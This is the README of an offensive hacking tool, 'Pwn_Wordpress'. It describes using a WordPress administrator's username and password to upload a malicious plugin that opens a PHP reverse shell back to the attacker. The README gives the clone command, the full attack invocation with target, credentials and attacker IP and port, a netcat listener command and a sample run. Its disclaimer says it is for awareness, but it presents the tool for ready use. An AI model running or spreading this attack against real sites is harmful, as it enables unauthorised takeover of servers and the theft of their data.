
<div align="center">

  ![LOGO](https://github.com/JoaoPedroMoreira02/Pwn_Wordpress/assets/103542430/7c6e38fe-7fda-4f97-9da1-b1a619f975d2)    
  
  [![License: GPL-2.0](https://img.shields.io/badge/License-GPL--2.0-blue.svg)](https://opensource.org/licenses/GPL-2.0)
  
  <img src="https://img.shields.io/badge/Language%20-Python3-green.svg" style="max-width: 100%;">
  <img src="https://img.shields.io/badge/Tool%20-Shell upload | reverse shell-brown.svg" style="max-width: 100%;">
  <img src="https://img.shields.io/badge/Target OS%20-Linux-yellow.svg" style="max-width: 100%;">
  <img src="https://img.shields.io/badge/Hacking tool%20-teste?style=flat-square" style="max-width: 100%;">  
  <img src="https://img.shields.io/badge/Type%20-Script-red.svg" style="max-width: 100%;">

</div>

# Evil Wordpress Plugin (Malicious)

Malicious, remotely performs an upload of a PHP reverse shell in the form of a plugin on a WordPress site. The exploit is only successful with user credentials, so make sure you know the target username and password and check if the target user has Administrator permissions.

Install by running:

```bash
  git clone https://github.com/Jsmoreira02/Pwn_Wordpress.git
```
    
## Parameters [Running Script]

### Attacking the Target Website: ###

![ezgif com-video-to-gif(1)](https://github.com/Jsmoreira02/Pwn_Wordpress/assets/103542430/532470ab-161f-487d-a59b-f3d0d7366c25)


- **The speed depends on your connection, check the stability of your connection in case there is a slowdown in execution**


```bash 
python3 Malicious.py -t http://<IP or domain_name> -u <Target Username> -p <Target Password> -L <LOCAL IP> -P <LOCAL PORT>

```

**Executing Handler**

```bash 
nc -lvp {LOCAL PORT}
```

**Help section (-h)**

```bash
usage: Malicious.py [-h] [-t] [-u] [-p] [-L] [-P]

Wordpress Malicious plugin upload

options:
  -h, --help        show this help message and exit
  -t , --target     Target URL
  -u , --username   Wordpress Username
  -p , --password   Wordpress Password
  -L , --LHOST      Attacker IP address
  -P , --LPORT      Attacker LOCAL PORT

./app.py -t http://domain_name.com/wordpress -u User_FOX -p Pass -L 192.168.20.2 -P 4040 

```


### In case of complications or disconnection issues, you can just manually trigger the connection at the URL link given by the program ###

 
***---> Correct Syntax: "http://IP/wordpress | Wrong syntax: http://IP/wordpress/ <---***

## 

- ***Good hacking :)***

# Warning:    
> I am not responsible for any illegal use or damage caused by this tool. It was written for fun, not evil and is intended to raise awareness about cybersecurity


